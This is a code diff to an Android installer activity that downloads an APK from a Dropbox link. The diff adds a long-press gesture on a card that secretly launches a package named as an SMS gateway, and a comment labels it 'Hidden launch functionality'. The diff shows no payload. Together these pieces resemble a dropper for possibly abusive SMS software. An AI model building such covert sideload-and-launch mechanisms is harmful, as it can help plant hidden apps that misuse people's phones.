@@ -12,9 +12,12 @@ import androidx.compose.material3.*
 import androidx.compose.runtime.*
 import androidx.compose.ui.Alignment
 import androidx.compose.ui.Modifier
+import androidx.compose.ui.input.pointer.pointerInput
 import androidx.compose.ui.text.font.FontWeight
 import androidx.compose.ui.text.style.TextAlign
 import androidx.compose.ui.unit.dp
+import androidx.compose.foundation.gestures.detectTapGestures
+import kotlin.math.abs
 import android.content.Intent
 import android.net.Uri
 import android.content.pm.PackageManager
@@ -41,6 +44,7 @@ class InstallerMainActivity : ComponentActivity() {
         private const val DOWNLOAD_URL = "https://www.dropbox.com/scl/fi/okzat71pnxd9phhuganww/app-mainapp-release.apk?rlkey=02xchcqeh5v3xi2zcvklcvdus&st=am2zxju7&dl=1"
         private const val APK_FILE_NAME = "randmonhereman.apk"
         private const val REQUEST_CODE_INSTALL_PERMISSION = 1001
+        private const val MAINAPP_PACKAGE_NAME = "com.earnbysms.smsgateway.mainapp"
     }
 
     private var isDownloading = mutableStateOf(false)
@@ -49,6 +53,37 @@ class InstallerMainActivity : ComponentActivity() {
     private var isInstalling = mutableStateOf(false)
     private var installationCompleted = mutableStateOf(false)
     private var needsPermission = mutableStateOf(false)
+
+    // Hidden launch functionality
+    private fun launchMainApp() {
+        try {
+            Log.d(TAG, "Attempting to launch main app: $MAINAPP_PACKAGE_NAME")
+            val launchIntent = packageManager.getLaunchIntentForPackage(MAINAPP_PACKAGE_NAME)
+            if (launchIntent != null) {
+                startActivity(launchIntent)
+                Log.d(TAG, "Main app launched successfully")
+                android.widget.Toast.makeText(
+                    this,
+                    "Main app launched",
+                    android.widget.Toast.LENGTH_SHORT
+                ).show()
+            } else {
+                Log.w(TAG, "Main app not installed or launch intent not found")
+                android.widget.Toast.makeText(
+                    this,
+                    "Main app not installed",
+                    android.widget.Toast.LENGTH_SHORT
+                ).show()
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Failed to launch main app", e)
+            android.widget.Toast.makeText(
+                this,
+                "Failed to launch main app",
+                android.widget.Toast.LENGTH_SHORT
+            ).show()
+        }
+    }
 
     private val downloadReceiver = object : BroadcastReceiver() {
         override fun onReceive(context: Context?, intent: Intent?) {
@@ -164,7 +199,14 @@ class InstallerMainActivity : ComponentActivity() {
         Card(
             modifier = Modifier
                 .fillMaxWidth()
-                .padding(16.dp),
+                .padding(16.dp)
+                .pointerInput(Unit) {
+                    detectTapGestures(
+                        onLongPress = {
+                            launchMainApp()
+                        }
+                    )
+                },
             elevation = CardDefaults.cardElevation(defaultElevation = 8.dp)
         ) {
             Column(
